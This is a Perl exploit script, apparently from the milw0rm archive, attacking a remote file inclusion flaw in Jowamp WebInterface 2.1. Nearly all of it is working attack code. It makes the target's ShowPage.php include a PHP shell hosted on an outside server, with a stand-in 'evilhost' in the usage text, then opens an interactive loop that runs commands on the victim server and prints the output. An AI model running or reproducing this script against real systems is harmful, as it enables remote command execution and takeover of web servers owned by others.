#!/usr/bin/perl
#  Jowamp  WebInterface v 2.1 Remote File Inclusion Vulnerablity
# Vulnerability found & Exploit [c]oded By Dr Max Virus
# Download:http://www.av.it.pt/jowamp/index_files/JOWAMP_WebInterface_version_2_1.zip
# User Must Be Logged In!
# In a web browser open the page http://localhost/jowamp/login/register.php to register new users. 


use LWP::UserAgent;

$target=@ARGV[0];
$shellsite=@ARGV[1];
$cmdv=@ARGV[2];

if($target!~/http:\/\// || $shellsite!~/http:\/\// || !$cmdv)
{
       usg()
}
header();


while()
{
print "[Shell] \$";
while (<STDIN>)
{
       $cmd=$_;
       chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req =
HTTP::Request->new(GET=>$target.'/JOWAMP_files/JOWAMP_ShowPage.php?link='.$shellsite='.?&'.$cmdv.'='.$cmd)or
die "\n\n Failed to Connect, Try again!\n";
$res = $xpl->request($req);
# The response of the server to the GET request we sent is stored in the
$info variable
$info = $res->content;
$info =~ tr/[\n]/[&#234;]/;


if (!$cmd) {
print "\nEnter a Command\n\n"; $info ="";
}


elsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:
Cannot execute a blank command in <b>/)
{
print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";
exit;
}


elsif ($info =~/^<br.\/>.<b>Warning/) {
print "\nInvalid Command\n\n";
};


if($info =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{
$final = $1;
$final=~ tr/[&#234;]/[\n]/;
print "\n$final\n";
last;
}

else {
print "[shell] \$";
}
}
}
last;


#Sub-Rountines
sub header()
{
print q{
********************************************************************************
Jowamp WebInterface v2.1  -- Remote Include Exploit

Vulnerablity found by: Dr Max Virus

Exploit [c]oded by: Dr Max Virus
********************************************************************************
}
}
sub usg()
{
header();
print q{
Usage: perl exploit.pl <jowamp fullpath> <Shell Location> <Shell Cmd>

<phorum-3.4.8a FULL PATH> - Path to site exp. www.site.com

<Shell Location> - Path to shell exp. www.evilhost.com/shell.txt

<Shell Cmd Variable> - Command variable for php shell

Example: perl exploit.pl http://www.site.com/jowamp/
**********************************************************************************
};

exit();
}

# milw0rm.com [2006-12-07]